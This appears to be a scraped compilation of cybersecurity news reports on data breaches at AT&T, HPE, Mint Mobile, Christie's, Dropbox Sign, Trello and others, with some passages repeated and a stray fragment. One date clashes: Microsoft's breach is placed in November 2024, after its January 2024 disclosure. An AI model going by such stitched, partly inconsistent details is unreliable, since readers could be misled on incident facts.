AT&T told BleepingComputer that they are investigating the data but also believe it originates from the known breach and was repackaged into a new leak. ""It is not uncommon for cybercriminals to repackage previously disclosed data for financial gain. We just learned about claims that AT&T data is being made available for sale on dark web forums, and we are conducting a full investigation,"" AT&T told BleepingComputer. As first spotted by HackRead , the AT&T data was released on a popular Russian-speaking hacking forum, where a threat actor claimed it was stolen during the 2024 AT&T Snowflake data theft attack , which exposed the call logs of 109 million customers. ""Originally one of the database from the snowflake breach here is my backup I created which has bogus numbers such as 00000 (I think federal agents...?) removed and I have also decrypted the SSNs and DOBs,"" reads the forum post. However, BleepingComputer's analysis of the leak indicates that the data actually originates from an AT&T data breach in 2021 conducted by a well-known threat actor named ShinyHunters, who attempted to sell it for $200,000. Three years later, in March 2024, another threat actor leaked the entire AT&T data on a cybercrime forum for free, stating it was from ShinyHunter's 2021 AT&T breach. This data included names, addresses, mobile phone numbers, encrypted date of birth, encrypted social security numbers, and other internal information. However, included in the leak were individual files that mapped the encrypted SSNs and DOBs with their unencrypted plain text strings. At the time, AT&T first denied that the data was theirs but eventually confirmed that the data was stolen from their systems and impacted 73 million customers. Analysis of the current leak by BleepingComputer shows it's the same data leaked in 2024 but cleaned up to remove internal AT&T data and add the unencrypted Social Security number and date of birth to each customer record. In total, there are 88,320,017 lines of data in the leak, but when you remove duplicates, it goes down to 86,017,088 unique records. Further processing of the data shows that it contains 48,896,044 unique phone numbers with associated customer information. This significant drop is caused by many customers having multiple records with the same phone number used at different addresses.

According to filings with Attorney General offices in New Hampshire and Massachusets , HPE started sending the breach notification letters last month to at least 16 people who had their driver's licenses, credit card numbers, and Social Security numbers stolen. ""HPE's forensic investigation determined that certain individuals' personal information may have been subject to unauthorized access,"" the company says in the letters. ""On January 29, 2025, HPE began providing notice of this event to impacted individuals, in accordance with applicable law."" When asked to share the number of employees affected by this data breach, an HPE spokesperson said it was ""a limited group of HPE team member mailboxes that were accessed, and only the information contained in those mailboxes was involved."" The group behind the attack, Cozy Bear (also known as Midnight Blizzard, APT29, and Nobelium), is believed to be part of Russia's Foreign Intelligence Service (SVR) and has also been linked to other high-profile breaches, including the infamous 2020 SolarWinds supply chain attack . The HPE breach incident was first disclosed in an SEC filing on January 29, 2024, when the company said it was notified on December 12 that suspected Russian hackers breached its cloud-based Office 365 email environment in May 2023 using a compromised account. ""We determined that this nation-state actor accessed and exfiltrated data beginning in May 2023 from a small percentage of HPE mailboxes belonging to individuals in our cybersecurity, go-to-market, business segments, and other functions. We believe the nation-state actor is Midnight Blizzard, also known as Cozy Bear,"" HPE told BleeingComputer at the time. ""The accessed data is limited to information contained in the users' mailboxes. We continue to investigate and will make appropriate notifications as required."" In the SEC filing, HPE added that the Office 365 incident was likely related to another May 2023 breach, when threat actors accessed the company's SharePoint server and stole files. Days before HPE's disclosure, Microsoft also warned that Cozy Bear hackers stole data from corporate email accounts and source code repositories . They first breached Microsoft's network in November 2024 in a password spray attack to access a legacy non-production test tenant account. HPE was previously breached in 2018 when Chinese malicious actors hacked into its network and used that access to breach its customers' devices. In 2021, it also disclosed that the data repos for its Aruba Central network monitoring platform had been compromised , allowing a threat actor to access information about monitored devices and their locations. More recently, in February 2024 and January 2025 , the company started investigating other potential security breaches after a threat actor using the IntelBroker handle claimed to have stolen HPE credentials, source code, and other sensitive information.

Roblox is an online gaming and game creation platform popular among younger audiences that design, create, and share games with a large community of over 200 million active users. The company hosts an annual Roblox Developer Conference (RDC) event that helps developers network, learn, and share knowledge with others through workshops and new tool presentations. The gaming platform recently learned that FNTech, the vendor handling the registration process for those conference events, had been breached, with someone gaining unauthorized access to its systems. ""A Roblox vendor recently notified us that there had been unauthorized access to a subset of Roblox user information from a 2022-2024 Roblox Developer Conference registration list via its website,"" reads a notice published on X . The data stolen from FNTech's systems includes conference attendee's full names, email addresses, and IP addresses. The breach has also been added to the data breach notification service Have I Been Pwned (HIBP), which reports that 10,386 unique email addresses are included in the exposed set. HIBP says 63% (6,500) of the compromised email addresses are new (not exposed previously). On a related note, in July 2023, HIBP added nearly 4,000 Roblox developer accounts who were, again, RDC attendees and whose data was leaked on a hacker forum . However, that set appeared to come from an older 2021 breach, exposing RDC attendees between 2017 and 2020. Although the latest data breach does not immediately put impacted Roblox developers at risk, the exposed information elevates the potential for targeted phishing attacks. Roblox concludes its statement by saying that it has taken steps to ensure that a similar data exposure will not occur in the future. Due to its community size and lively economic activity , Roblox and its users have been targeted by hackers several times in the past.

The British company provides mobile telecommunications and voice IP (VoIP) services in 60 countries, including the United States, the U.K., Germany, Australia, France, Italy, and the Netherlands. The attack occurred over the weekend and caused service provision interruptions in all but four countries. Specifically, customers and retailers reported that they were unable to access the company’s top-up portal. National and international calling services have also been affected according to the company's press release. In response to the situation and to determine the impact on customer data, Lyca Mobile says it has launched an urgent investigation that involves third-party IT experts. Law enforcement and data protection authorities have also been notified about the security incident. “Our number one priority is ensuring the safety and security of our customers’ data, and we are urgently investigating whether any personal information may have been compromised as part of this attack,” reads the company statement . “We are confident that all our records are fully encrypted , and we will keep customers updated on the outcome of our investigation as we work with our expert partners to establish the facts.” Lyca Mobile's statement about the incident and the effect it caused is no longer available at the address specified by a company representative. It is also worth noting that the page with Lyca's statement included a ""noindex"" rule that prevented search engines from showing it in search results. The company comment about encrypted customer data indicates that the firm suspects or has verified unauthorized access to its databases. However, the statement does not clarify the type of encryption used for protecting customer data. Regarding the availability of Lyca Mobile’s services, the firm says restoration efforts are underway.

Lyca Mobile investigates customer data leak after cyberattack,https://www.bleepingcomputer.com/news/security/lyca-mobile-investigates-customer-data-leak-after-cyberattack/,Bill Toulas,"October 5, 2023","Lyca Mobile has released a statement about an unexpected disruption on its network caused by a cyberattack that may have also compromised customer data. The British company provides mobile telecommunications and voice IP (VoIP) services in 60 countries, including the United States, the U.K., Germany, Australia, France, Italy, and the Netherlands. The attack occurred over the weekend and caused service provision interruptions in all but four countries. Specifically, customers and retailers reported that they were unable to access the company’s top-up portal. National and international calling services have also been affected according to the company's press release. In response to the situation and to determine the impact on customer data, Lyca Mobile says it has launched an urgent investigation that involves third-party IT experts. Law enforcement and data protection authorities have also been notified about the security incident. “Our number one priority is ensuring the safety and security of our customers’ data, and we are urgently investigating whether any personal information may have been compromised as part of this attack,” reads the company statement . “We are confident that all our records are fully encrypted , and we will keep customers updated on the outcome of our investigation as we work with our expert partners to establish the facts.” Lyca Mobile's statement about the incident and the effect it caused is no longer available at the address specified by a company representative. It is also worth noting that the page with Lyca's statement included a ""noindex"" rule that prevented search engines from showing it in search results. The company comment about encrypted customer data indicates that the firm suspects or has verified unauthorized access to its databases. However, the statement does not clarify the type of encryption used for protecting customer data. Regarding the availability of Lyca Mobile’s services, the firm says restoration efforts are underway. However, certain operational services remain unavailable in some of the impacted markets.

Blackbaud is a U.S.-based company listed on NASDAQ with operations in multiple countries and a provider of cloud-based donor data management software catering to nonprofit organizations, like charities, education organizations, and healthcare agencies. The FTC's complaint alleges that the company ""failed to monitor attempts by hackers to breach its networks, segment data to prevent hackers from easily accessing its networks and databases, ensure data that is no longer needed is deleted, adequately implement multifactor authentication, and test, review and assess its security controls"" and ""allowed employees to use default, weak, or identical passwords for their accounts."" As part of the settlement, the FTC ordered the software provider to improve its security measures and ensure that it deletes any customer data that is no longer needed from its systems. Blackbaud will also be barred from inaccurately portraying its data security and data retention protocols and will be required to create an information security program designed to rectify the concerns outlined in FTC's complaint. According to the proposed order, Blackbaud must also establish a data retention schedule detailing the rationale behind retaining personal data and specifying the timeline for its deletion. Blackbaud is also mandated to promptly notify the FTC in the event of a data breach that requires reporting to relevant local, state, or federal agencies. ""Blackbaud's shoddy security and data retention practices allowed a hacker to obtain sensitive personal data about millions of consumers. Companies have a responsibility to secure data they maintain and to delete data they no longer need,"" said Samuel Levine, Director of FTC's Bureau of Consumer Protection. ​The FTC says that Blackbaud paid the ransomware gang that stole the personal data belonging to millions of people from its systems a ransom of 24 Bitcoin (worth around $250,000 at the time) after the attackers threatened to leak the stolen data online. ""The company never verified, however, that the hacker actually deleted the stolen data, according to the complaint,"" the FTC said on Thursday. Blackbaud disclosed the breach in July 2020 and later revealed that it impacted data belonging to over 13,000 Blackbaud business customers and their clients from the U.S., Canada, the U.K., and the Netherlands, including banking information, social security numbers, and plaintext credentials. It also submitted an 8-K filing with the U.S. Securities and Exchange Commission (SEC) in September 2020, which left out crucial details regarding the full scope of the breach and downplayed the risk associated with the sensitive stolen information, describing it as hypothetical, according to the SEC. By November 2020, the company was already a defendant in 23 proposed class-action lawsuits related to the May 2020 breach in the U.S. and Canada. Blackbaud agreed to pay $3 million in March 2023 to settle SEC charges highlighting its failure to disclose the ransomware attack's ""full impact."" In October, the cloud provider also agreed to pay $49.5 million to settle a joint multi-state investigation of the breach backed by attorneys general from 49 U.S. states. ""Blackbaud's failure to accurately convey the scope and severity of the breach kept victims in the dark and delayed them from taking protective actions, making a bad situation even worse,"" said FTC Chair Lina M.

Access Management Systems are security systems that control employee access to buildings, facilities, and restricted areas via biometrics, ID cards, or license plates. Security researchers at Modat conducted a comprehensive investigation in early 2025 and discovered tens of thousands of internet-exposed AMS that were not correctly configured for secure authentication, allowing anyone to access them. The exposed AMS contained sensitive unencrypted employee data, including: In some cases, Modat could edit employee records, add fake employees, change access credentials, or manipulate building entry systems to restrict access to legitimate employees or allow unauthorized physical access to malicious actors. The physical security risks are particularly worrying for exposed AMS for government buildings and critical infrastructure such as power stations and water treatment units. Apart from physical security, the exposed information could also be leveraged to empower spear-phishing and social engineering attacks against the exposed organizations. Out of the total 49,000 exposed AMS devices globally, most (16,678) are located in Italy, followed by Mexico (5,940) and Vietnam (5,035). In the U.S., Modat found 1,966 exposed AMS systems. The researchers contacted all system owners directly to inform them of the AMS exposure and the risks this entails to their organizations. However, they told BleepingComputer they have not heard back yet, so it is unclear how many acted to secure their systems. Vendors were also contacted, and some responded that they are working with impacted clients to fix the exposure. Modat provided several security recommendations for AMS users, including taking their systems offline to prevent unauthorized remote access or placing them behind firewalls and VPNs to restrict access only to authorized personnel. It is also recommended that the default admin credentials be changed as those are easy to brute-force, and multi-factor authentication (MFA) should be implemented if the option is available. AMS admins should apply their vendors' latest software and firmware updates and reduce unnecessary network services that may increase the attack surface. Biometric data and PII should always be stored in encrypted form, and data of past employees should be purged to avoid unauthorized access via old accounts that haven't been disabled on other systems.

IMS is a multinational corporation that provides business consulting, information technology, and outsourcing services. It specializes in covering the needs of firms in the insurance and financial services industries. The company has a significant presence in the U.S., serving large financial institutions such as the Bank of America and seven out of the top ten insurers in the country. In February 2024, IMS informed the public that it had been hit by a ransomware in November 2023, which resulted in the compromise of the personal data of about 57,000 Bank of America customers . At the time, LockBit claimed the attack and said that it had encrypted 2,000 computers on the IMS network. In a new notification shared with the authorities in the U.S., IMS now says the total number of people affected by the November 2023 ransomware attack is a little over 6 million. “With the assistance of third-party eDiscovery experts, retained through outside counsel, IMS proceeded to conduct a thorough and time-intensive review of the data at issue to identify the personal information subject to unauthorized access and acquisition and determine to whom the personal information relates,” reads the notification . “IMS has notified its impacted organizations of the Incident and of the compromise of any personal information pertaining to them.” The data confirmed as compromised varies from one individual to another but includes the following: To mitigate the risk from the exposure, the notification letters enclose instructions on how to access a free-of-charge, two-year identity protection and credit monitoring service through Kroll.

""In the early morning hours of January 25th, 2024, GHC-SCW identified unauthorized access to their network.

Mint Mobile discloses new data breach exposing customer data,https://www.bleepingcomputer.com/news/security/mint-mobile-discloses-new-data-breach-exposing-customer-data/,Lawrence Abrams,"December 22, 2023","Mint Mobile has disclosed a new data breach that exposed the personal information of its customers, including data that can be used to perform SIM swap attacks. Mint is a mobile virtual network operator (MVNO) offering budget, pre-paid mobile plans. T-Mobile has proposed paying $1.3 billion to purchase the company. The company began notifying customers on December 22nd via emails titled ""Important information regarding your account,"" stating that they suffered a security incident and a hacker obtained customer information. ""We are writing to inform you about a security incident we recently identified in which an unauthorized actor obtained some limited types of customer information,"" warns the Mint Mobile data breach notification. ""Our investigation indicates that certain information associated with your account was impacted."" The company said they resolved the breach and are working with third-party cybersecurity experts to secure their systems. The customer data exposed in the breach includes: Mint says they do not store credit card numbers, so they were not exposed. The company also said they protect passwords with ""strong cryptographic technology,"" so they are not compromised. The company did not make it clear from this statement if hashed passwords were accessed by the attacker. The exposed data is concerning, as it is enough information for a threat actor to conduct SIM swapping attacks, which is when an attacker ports a person's number to their own device. Once they gain access to the number, they can try to access the user's online accounts by performing password resets and receiving the OTP codes to get past multi-factor authentication. Threat actors commonly use this technique to breach accounts at cryptocurrency exchanges, stealing all assets stored in the online wallet. However, Mint says that customers do not need to take any action and can call customer support at 949- 704-1162 with any questions. A Mint Reddit moderator has confirmed that this number was set up specifically to handle questions about the data breach. ""If you received a notice via email from no-reply@account.mintmobile.com on December 22, 2023, it is from Mint and is not a scam. The Customer Care number was setup to handle specific questions about this communication,"" explained a Mint moderator on Reddit. While Mint has not disclosed details on how they were breached, the FalconFeeds threat intel service reported in July 2023 that a threat actor attempted to sell data on a hacking forum that was allegedly stolen from Mint Mobile and Ultra Mobile. The threat actor said the data is a few months old but contained the last four digits of customers' credit cards, so it is unclear if the incident is related to the disclosed breach. Mint Mobile previously suffered a data breach in 2021 when an unauthorized person accessed subscribers' account information and ported phone numbers to another carrier. BleepingComputer has contacted Mint with questions about the attack and whether hashed passwords were exposed but has not received a reply. Update 12/23/23: Made correction that Mint Mobile is not owned by T-Mobile.

The company began notifying customers on December 22nd via emails titled ""Important information regarding your account,"" stating that they suffered a security incident and a hacker obtained customer information. ""We are writing to inform you about a security incident we recently identified in which an unauthorized actor obtained some limited types of customer information,"" warns the Mint Mobile data breach notification. ""Our investigation indicates that certain information associated with your account was impacted."" The company said they resolved the breach and are working with third-party cybersecurity experts to secure their systems. The customer data exposed in the breach includes: Mint says they do not store credit card numbers, so they were not exposed. The company also said they protect passwords with ""strong cryptographic technology,"" so they are not compromised. The company did not make it clear from this statement if hashed passwords were accessed by the attacker. The exposed data is concerning, as it is enough information for a threat actor to conduct SIM swapping attacks, which is when an attacker ports a person's number to their own device. Once they gain access to the number, they can try to access the user's online accounts by performing password resets and receiving the OTP codes to get past multi-factor authentication. Threat actors commonly use this technique to breach accounts at cryptocurrency exchanges, stealing all assets stored in the online wallet. However, Mint says that customers do not need to take any action and can call customer support at 949- 704-1162 with any questions. A Mint Reddit moderator has confirmed that this number was set up specifically to handle questions about the data breach. ""If you received a notice via email from no-reply@account.mintmobile.com on December 22, 2023, it is from Mint and is not a scam. The Customer Care number was setup to handle specific questions about this communication,"" explained a Mint moderator on Reddit. While Mint has not disclosed details on how they were breached, the FalconFeeds threat intel service reported in July 2023 that a threat actor attempted to sell data on a hacking forum that was allegedly stolen from Mint Mobile and Ultra Mobile. The threat actor said the data is a few months old but contained the last four digits of customers' credit cards, so it is unclear if the incident is related to the disclosed breach. Mint Mobile previously suffered a data breach in 2021 when an unauthorized person accessed subscribers' account information and ported phone numbers to another carrier. BleepingComputer has contacted Mint with questions about the attack and whether hashed passwords were exposed but has not received a reply. Update 12/23/23: Made correction that Mint Mobile is not owned by T-Mobile. It's budget season!

Fujitsu is the world's sixth largest IT services provider, employing 124,000 people and having an annual revenue of $23.9 billion. Its portfolio includes computing products like servers and storage systems, software, telecommunications equipment, and a range of services, including cloud solutions, system integration, and IT consulting services. The company has a strong presence in the global market, operating in over 100 countries. It also maintains a multifaceted relationship with the Japanese government, undertaking public sector projects, getting involved in government-funded R&D projects, and playing a crucial role in the country's national security. An announcement published late last week on the firm's news portal discloses a major cybersecurity incident that has compromised systems and data, including sensitive information of customers. ""We have confirmed the presence of malware on several of our business computers, and as a result of our internal investigation, it has been discovered that files containing personal information and information related to our customers could be illicitly removed,"" reads a Fujitsu notice . ""After confirming the presence of the malware, we promptly isolated the affected business computers and have taken measures such as strengthening the monitoring of other business computers."" Fujitsu says it will continue investigating how the malware found its way into business systems and what data it exfiltrated. Though the firm says it has received no reports of the misuse of customer data, it has informed the Personal Information Protection Commission about the incident and is currently preparing individual notices for impacted customers. BleepingComputer has contacted Fujitsu to learn if the data breach affects corporate clients or consumers and to inquire about the number of impacted individuals/entities, but a comment wasn't immediately available. In May 2021, Fujitsu's ProjectWEB information sharing tool was exploited to breach the offices of multiple Japanese government agencies , allowing unauthorized access and stealing of 76,000 email addresses and proprietary data. The stolen data included sensitive information from government systems and potentially air traffic control data from the Narita International Airport. Subsequent investigations concluded in December 2021 showed that hackers leveraged stolen ProjectWEB credentials to achieve the breach. The investigation also revealed several vulnerabilities in ProjectWEB, which was discontinued and later replaced by a new information-sharing tool incorporating zero-trust security measures.

Henry Schein is a healthcare solutions provider and a Fortune 500 company with operations and affiliates in 32 countries and revenue of over $12 billion in 2022. On October 15, the company disclosed that it was forced to take some systems offline to contain a cyberattack that impacted manufacturing and distribution operations. While Henry Schein did not disclose the nature of the attack, the BlackCat (ALPHV) ransomware gang claimed responsibility , stating that they stole 35 TB of sensitive files. Almost a month later, on November 22, the company once again disclosed that it suffered another attack, again by the now shut down BlackCat ransomware gang . The ransomware gang claimed to have encrypted Henry Schein's network a second time after negotiations failed and threatened to encrypt it a third time if a ransom was not paid. While it is unknown if the threat actors followed through with another attack, they released some of the data stolen from Henry Schein on their data leak site.

The Biggest Takeaways from Recent Malware Attacks,https://www.bleepingcomputer.com/news/security/the-biggest-takeaways-from-recent-malware-attacks/,Home,"April 4, 2024","Among the never-ending list of malicious software that threat actors use in cyber attacks are viruses, worms, trojans, ransomware, spyware, and adware. Today's malware is not just about causing immediate damage; some programs get embedded within systems to siphon off data over time, disrupt operations strategically, or lay the groundwork for massive, coordinated attacks. A prime example is a recently found malicious backdoor in a popular compression tool, known as xz Utils. Thankfully the malicious code was identified early “due to bad actor sloppiness”, but the consequences could’ve been massive. Read on to get the lowdown on recent high-profile malware attacks along with strategies to help limit malware risks at your organization. Here's a detailed overview of recent malware attacks, highlighting key incidents and offering valuable insights and lessons learned from each event. A prolific and advanced cross-platform malware framework infected over a million Windows and Linux systems during a five-year spell. Researchers only uncovered StripedFly in 2022 , and its stealthy capabilities included a built-in TOR network tunnel. Malware continues to get more complex; this malicious framework comes with several modules that aid with the evasion of security tools, establishing persistence with PowerShell scripts, and more. Persistent and stealthy operations are central to modern malware, which increases the need for advanced and layered security strategies. In 2023, ten new Android banking trojans emerged that targeted 985 bank and fintech/trading apps. Opportunistic cybercriminals use these trojans, often disguised as legitimate apps, to trick people into downloading them. In the background, they intercept and manipulate banking sessions, capture login credentials, and even bypass multi-factor authentication methods. 10 new Android banking trojans in a single year highlight the prominent trend of malware targeting financial apps. Banking trojans are getting more advanced, with 2024’s versions having features like automated transfer systems and live screen-sharing. News emerged in early 2024 that Chinese hackers managed to infiltrate the Dutch Ministry of Defence’s network with malware in 2023. The threat actors used sophisticated malware called ""Coathanger."" This malware was notable for its ability to persist through firmware upgrades and system reboots, which made it particularly difficult to detect and remove. This attack underscores the strategic use of advanced malware in state-sponsored cyber operations. More advanced malware is increasingly resilient and persistent, which shows the need for advanced threat detection and response. With 5.5 billion worldwide malware attacks each year, this is one cyber threat that pretty much every business needs to think about and limit its exposure to. Here are five must-have strategies for effective malware risk reduction. Anti-virus and anti-malware solutions are cornerstone elements in malware risk reduction. The use of both types of solutions addresses the broad spectrum of malware threats that your organization will face. Anti-virus software prevents, detects, and removes viruses and worms. These tools mostly use signature-based detection, which involves scanning files and comparing them to a database of known virus signatures. Modern anti-virus solutions also include heuristic analysis that enables them to detect novel computer viruses by analyzing behaviors and characteristics common to malicious software. Anti-malware tools combat a wider range of malicious software, including newer and more sophisticated threats like ransomware, spyware, and zero-day attacks (threats that exploit previously unknown vulnerabilities). Alongside signature-based detection, these solutions also use machine learning and behavioral analysis. It’s easy to automate tasks related to your anti-malware software using a security automation copilot. For instance, Blink can automatically scan a file for malware by detonating it in a sandbox environment provided by Hybrid Analysis. While traditional technical safeguards like anti-virus and anti-malware are important, don’t underestimate the role of human awareness and intuition. Regular training makes employees more capable of spotting signs of the latest malware trends and tactics, such as specific phishing campaigns or malicious attachments in team collaboration tools. Web browsing is one of the main access vectors for malware. Security training also emphasizes the importance of cautious online behavior like not downloading things from untrusted websites or not clicking dodgy links. Device management is all about securely deploying, monitoring, and maintaining devices connected to your network to prevent unauthorized access and protect against malware. This includes IT admins enforcing security policies across user devices and automating software updates to close off vulnerabilities before hackers exploit them to install malware. Another important part of device management is controlling which applications your users can install on workstations. Consider whitelisting approved apps and blocking unauthorized software installations. Some enterprise device management tools can remotely wipe sensitive data or lock systems in the event a computer, laptop, or USB drive gets lost or stolen. Automating device management tasks can boost efficiency for your IT team. For instance, you could use the automation below, which quickly deactivates a missing or stolen MFA device of an AWS user. Training employees is great, but it’s still helpful to know what they’re doing and what apps/websites they’re interacting with. After all, mistakes still happen, and sophisticated threat actors might still be able to install malware on devices. User Behavior Analysis (UBA) deploys machine learning and data analytics to get a detailed understanding of user activity within your organization's network. This analysis helps better identify anomalies that could indicate a malware infection. The technical prowess of UBA lies in its ability to detect subtle, yet potentially malicious, activities that could elude traditional security tools. Anomalies like a user accessing high volumes of data at strange times or data transfers to external drives/services could indicate the presence of a trojan horse that has hijacked that user's credentials to exfiltrate data. When users have more access privileges than they need, this creates a larger attack surface for malware to infect and spread within your network. An interesting survey of IT pros in the US found that 45 percent believed users in their company have more access privileges than they need. User privilege management addresses this through things like role-based access controls, regular privilege audits and reviews , multi-factor authentication (MFA), and automated de-provisioning of access to resources when people leave or change roles. Automation is a powerful tool in the malware defense arsenal. After identifying a threat, automated systems or security workflows can execute predefined response actions, such as isolating infected devices , detonating files in sandboxes, or blocking malicious communication without the need for manual intervention. This automation speeds up the response to attacks and minimizes the potential damage malware can cause. Threats extend beyond just malware.

Christie's starts notifying clients of RansomHub data breach,https://www.bleepingcomputer.com/news/security/christies-starts-notifying-clients-of-ransomhub-data-breach/#comment_form,Sergiu Gatlan,"June 7, 2024","British auction house Christie's is notifying individuals whose data was stolen by the RansomHub ransomware gang in a recent network breach. Christie's discovered that it was the victim of a security breach that affected some of its systems on May 9, 2024. After becoming aware of the event, Christie's took measures to secure its network and hired external cybersecurity experts to help investigate the incident's impact. The auction house says it also notified law enforcement and is now working to support their investigation. While analyzing the breach, Christie's found that a threat actor who breached its systems accessed and extracted customer files between May 8 and May 9. Following the investigation, Christie's reviewed the accessed files to identify individuals whose information may have been affected, obtain their contact information, and alert them of the incident after completing the review on May 30. The data breach notification letters sent to affected individuals state that the auction house is ""not aware of any attempts to misuse your information as a result of this incident."" ""We took additional steps to secure our systems and continue to evaluate technical and organizational measures to avoid the reoccurrence of a similar incident,"" Christie's added [ PDF ]. The auction house is also offering impacted people a free twelve-month subscription for the CyEx Identity Defense Total identity theft and fraud monitoring service, which will alert them of changes to their Experian, Equifax, and TransUnion credit files to spot any potentially fraudulent activity on their credit reports. While Christie's didn't name the attackers behind the May breach, the RansomHub gang added the auction house to its dark web leak portal , claiming it had breached its systems and stolen sensitive client data. The cybercriminals claimed to have exfiltrated the full names, addresses, ID document details, and various other sensitive personal information of at least 500,000 Christie's clients. ​RansomHub has since updated the Christie's entry, saying they've sold the stolen data on their own auction platform. BleepingComputer couldn't independently verify the threat actors' claims that they sold the data. The day the extortion hub claimed the Christie's breach, a spokesperson told BleepingComputer that attackers had breached the company's network and stole a limited amount of personal data belonging to some of its clients. However, BleepingComputer was also told that the company found no evidence that any financial or transactional records were compromised during the incident. RansomHub is a relatively new operation that demands ransom payment from victims in exchange for not leaking files stolen during attacks. If negotiations fail, it often auctions the stolen files exclusively to the highest bidder. While the ransomware gang was identified as a potential buyer of Knight ransomware source code , they hardly ever encrypt files during their attacks, focusing instead on data-theft-based extortion. Recently, RansomHub claimed the breach of leading U.S. telecom provider Frontier Communications, which had to shut down its systems in April to contain a cyberattack. The company warned 750,000 customers this week that their information was exposed in a data breach.

BleepingComputer couldn't independently verify the threat actors' claims that they sold the data. The day the extortion hub claimed the Christie's breach, a spokesperson told BleepingComputer that attackers had breached the company's network and stole a limited amount of personal data belonging to some of its clients. However, BleepingComputer was also told that the company found no evidence that any financial or transactional records were compromised during the incident. RansomHub is a relatively new operation that demands ransom payment from victims in exchange for not leaking files stolen during attacks. If negotiations fail, it often auctions the stolen files exclusively to the highest bidder. While the ransomware gang was identified as a potential buyer of Knight ransomware source code , they hardly ever encrypt files during their attacks, focusing instead on data-theft-based extortion. Recently, RansomHub claimed the breach of leading U.S. telecom provider Frontier Communications, which had to shut down its systems in April to contain a cyberattack. The company warned 750,000 customers this week that their information was exposed in a data breach.

Dropbox Sign (formerly HelloSign) is an eSignature platform allowing customers to send documents online to receive legally binding signatures. The company says they detected unauthorized access to Dropbox Sign's production systems on April 24 and launched an investigation. This investigation determined that the threat actors gained access to a Dropbox Sign automated system configuration tool, which is part of the platform's backend services. This configuration tool enabled the threat actor to execute applications and automated services with elevated privileges, allowing the attacker to access the customer database. ""Upon further investigation, we discovered that a threat actor had accessed data including Dropbox Sign customer information such as emails, usernames, phone numbers and hashed passwords, in addition to general account settings and certain authentication information such as API keys, OAuth tokens, and multi-factor authentication,"" warns Dropbox. For those users who used the eSignature platform but did not register an account, their email addresses and names were also exposed. The company says they found no evidence that the threat actors gained access to customers' documents or agreements and did not access the platforms of other Dropbox services. Dropbox says that it reset all users' passwords, logged out all sessions to Dropbox Sign, and restricted how API keys can be used until they are rotated by the customer. The company has provided additional information in the security advisory on how to rotate API keys to once again receive full privileges. Those who utilize MFA with Dropbox Sign should delete the configuration from their authenticator apps and reconfigure it with a new MFA key retrieved from the website. Dropbox says they are currently emailing all customers who were impacted by the incident. For now, Dropbox Sign customers should be on the lookout for potential phishing campaigns utilizing this data to collect sensitive information, such as plaintext passwords.

How initial access brokers (IABs) sell your users’ credentials,https://www.bleepingcomputer.com/news/security/how-initial-access-brokers-iabs-sell-your-users-credentials/#comment_form,Home,"January 8, 2025","Even if you haven’t looked into the methods of initial access brokers (IABs), you've almost certainly read about their handiwork in recent cyber-attacks. These specialized cybercriminals break into corporate networks and sell stolen access to other attackers. Think of them as high-tech locksmiths for hire — they crack security systems and sell the ""keys"" to ransomware groups and cyber criminals who launch their own attacks. To understand how IABs operate, consider a recent incident targeting Amazon Web Services (AWS) customers. The attackers systematically scanned AWS systems for vulnerabilities, stealing over two terabytes of sensitive data, including thousands of credentials — from AWS access keys to database logins. True to the IAB business model, they sold this stolen access through private Telegram channels, allowing other criminals to target the compromised organizations. So how can your business protect itself against IABs? Here’s what you need to know about how IABs operate, why they prize user credentials above other digital assets, and the steps you can take to fortify your organization’s defenses. IABs run their operations like legitimate businesses, complete with customer service teams, tiered pricing models, and money-back guarantees if their stolen access doesn't work. And they have something for everyone on the dark web. For small-scale criminals who have funds but lack technical expertise, IABs provide an entry point to high-value corporate targets they could never breach independently. For more sophisticated attackers, particularly ransomware groups, IABs offer a valuable efficiency boost — instead of wasting weeks trying to break in, they simply buy guaranteed access and immediately begin deploying malware or stealing data. As a result, cybercrime is more efficient. IABs handle the heavy lifting of infiltrating the network while their customers concentrate on monetizing access with their own attacks. IABs provide cybercriminals with one-stop-shopping for their nefarious deeds, hawking everything from basic VPN credentials and remote desktop access to powerful admin accounts and cloud service tokens. Their sales listings typically include detailed information about the victim organization — like annual revenue, industry sector, and number of employees — allowing buyers to hand-pick targets that best suit their goals. A basic user account may sell for a few hundred dollars, while an email administrator’s credentials could command $140,000 . Compromised credentials remain their most valuable commodity among all the types of access IABs sell. And recent breaches at major companies demonstrate how devastating stolen credentials can be. These incidents highlight that even companies with substantial cybersecurity budgets can fall victim to attacks that begin with compromised credentials. The scale of credential compromise is staggering. The 2024 IBM Cost of a Data Breach Report found that stolen or compromised credentials were responsible for 19% of all breaches, with these incidents taking an average of 292 days to identify. And the 2024 Verizon Data Breach Investigations Report found that stolen credentials were the first line of attack in 24% of all breaches. So how can your organization keep its data and systems safe? One of the best ways is to use threat intelligence tools proactively to help identify compromised credentials before attackers can use them. Modern threat intelligence platforms continuously monitor dark web markets, paste sites, and underground forums where credentials are traded. And if employee credentials appear in new data dumps or are offered for sale by IABs? A threat intelligence platform can alert your security team, allowing them to immediately force password resets, lock affected accounts, and investigate suspicious activity. But monitoring alone isn't enough — your organization must create and enforce robust password policies that keep employees from using compromised credentials in the first place. Consider implementing a specialized solution like Specops Password Policy , which actively checks your organization's Active Directory passwords against a continuously updated database of over 4 billion unique known compromised credentials. The Specops database includes credentials found on the dark web by a human-led threat intelligence team. By continuously scanning your Active Directory against this growing list of breached passwords, you add a layer of protection that prevents attackers from exploiting leaked credentials to infiltrate your network. While no solution can completely eliminate the threat from IABs, understanding how they operate and implementing strong credential protection measures can reduce your risk. Take a proactive approach, combining threat intelligence to know when your credentials have been exposed with robust password policies that prevent compromised credentials from being used. By staying vigilant and maintaining a strong defense, your organization can reduce its vulnerability to credential-based attacks.

Trello is an online project management tool owned by Atlassian. Businesses commonly use it to organize data and tasks into boards, cards, and lists. In January, BleepingComputer reported that a threat actor known as 'emo' was selling profiles for 15,115,516 Trello members on a popular hacking forum. While almost all of the data in these profiles is public information, each profile also contained a non-public email address associated with the account. While Atlassian, the owner of Trello, did not confirm at the time how the data was stolen, emo told BleepingComputer it was collected using an unsecured REST API that allowed developers to query for public information about a profile based on users' Trello ID, username, or email address. emo created a list of 500 million email addresses and fed it into the API to determine if they were linked to a Trello account. The list was then combined with the returned account information to create member profiles for over 15 million users. Today, emo shared the entire list of 15,115,516 profiles on the Breached hacking forum for eight site credits (worth $2.32). ""Trello had an open API endpoint that allows any unauthenticated user to map an email address to a trello account,"" emo explained in the forum post. ""I originally was only going to feed the endpoint emails from 'com' (OGU, RF, Breached, etc.) databases but I just decided to keep going with emails until I was bored.""

